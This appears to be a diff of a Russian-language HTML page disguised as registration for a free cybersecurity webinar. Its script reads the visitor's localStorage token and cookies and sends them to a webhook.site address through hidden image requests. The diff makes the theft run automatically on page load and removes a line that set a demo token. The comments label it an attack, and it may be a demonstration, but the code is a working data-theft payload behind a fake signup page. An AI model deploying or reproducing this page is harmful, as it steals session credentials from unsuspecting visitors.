@@ -1,5 +1,3 @@
-
-    
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -49,32 +47,31 @@
   <h1>📢 Бесплатный вебинар: «Кибербезопасность 2025»</h1>
   <p>Успей зарегистрироваться — количество мест ограничено!</p>
 
-  <!-- 🟦 Кнопка вызывает JS-функцию -->
   <button onclick="attack()">Записаться</button>
 
   <div class="confirmation" id="ok">✅ Вы успешно зарегистрированы!</div>
   <iframe name="hiddenFrame"></iframe>
 
-  <!-- 🟨 Вот здесь определена сама функция -->
+  <!-- АТАКА: кража токена и cookie -->
   <script>
     function attack() {
       const token = localStorage.getItem("token");
       const cookie = document.cookie;
 
+      // Отправка на Webhook
       const img1 = new Image();
       img1.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=" + encodeURIComponent(token || 'null');
 
       const img2 = new Image();
       img2.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(cookie || 'none');
 
+      // Показываем сообщение
       document.getElementById("ok").style.display = "block";
     }
-  </script>
-    <script>
-  if (!localStorage.getItem("token")) {
-    localStorage.setItem("token", "demo_token_123");
-  }
-</script>
 
+    // 💥 АТАКА: Автоматическая кража без клика
+    attack();
+  </script>
 </body>
 </html>
+
